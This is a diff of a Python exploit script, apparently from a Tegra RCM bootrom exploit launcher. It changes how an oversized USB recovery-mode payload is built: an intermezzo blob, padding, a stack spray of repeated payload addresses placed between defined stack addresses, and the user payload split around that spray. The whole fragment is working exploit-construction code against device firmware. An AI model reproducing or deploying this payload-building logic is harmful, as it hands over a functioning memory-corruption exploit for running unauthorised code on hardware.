@@ -666,9 +666,7 @@ RCM_HEADER_SIZE = RCM_V1_HEADER_SIZE
 
 # Use the maximum length accepted by RCM, so we can transmit as much payload as
 # we want; we'll take over before we get to the end.
-# length  = 0x30298
 length  = 0x30000 + RCM_HEADER_SIZE - 0x10
-# length  = 0x0001f814
 payload = length.to_bytes(4, byteorder='little')
 print("Setting rcm msg size to 0x{:08x}".format(length))
 print("RCM payload (len_insecure): {}".format(payload.hex()))
@@ -690,25 +688,41 @@ with open(intermezzo_path, "rb") as f:
     intermezzo_size = len(intermezzo)
     payload        += intermezzo
 
-print("intermezzo size: 0x{:08x}".format(intermezzo_size))
+print("Payload offset of padding before user payload: 0x{:08x}".format(len(payload)))
 
-assert(intermezzo_size % 4 == 0)
+# Pad the payload till the start of the user payload.
+padding_size   = PAYLOAD_START_ADDR - (RCM_PAYLOAD_ADDR + intermezzo_size)
+payload += (b'\0' * padding_size)
+
+target_payload = b''
+
+# Read the user payload into memory.
+with open(payload_path, "rb") as f:
+    target_payload = f.read()
+
+print("Payload offset of user payload first part: 0x{:08x}".format(len(payload)))
+
+# Fit a collection of the payload before the stack spray...
+padding_size   = STACK_SPRAY_START - PAYLOAD_START_ADDR
+payload += target_payload[:padding_size]
 
 print("Payload offset of stack spray: 0x{:08x}".format(len(payload)))
 
 # ... insert the stack spray...
-repeat_count = int((length - 2 * USB_XFER_MAX - len(payload)) / 4)
-print("injecting {} copies of payload address".format(repeat_count))
+repeat_count = int((STACK_SPRAY_END - STACK_SPRAY_START) / 4)
 payload += (RCM_PAYLOAD_ADDR.to_bytes(4, byteorder='little') * repeat_count)
 
-print("Payload offset after stack spray 0x{:08x}".format(len(payload)))
+print("Payload offset user payload second part 0x{:08x}".format(len(payload)))
+
+# ... and follow the stack spray with the remainder of the payload.
+payload += target_payload[padding_size:]
+
+print("Payload offset of remaining RCM padding 0x{:08x}".format(len(payload)))
 
 # Pad the payload to fill a USB request exactly, so we don't send a short
 # packet and break out of the RCM loop.
 payload_length = len(payload)
 padding_size   = USB_XFER_MAX - (payload_length % USB_XFER_MAX)
-print("End padding size 0x{:08x}".format(padding_size))
-
 payload += (b'\0' * padding_size)
 
 print("Payload offset of end of payload 0x{:08x}".format(len(payload)))
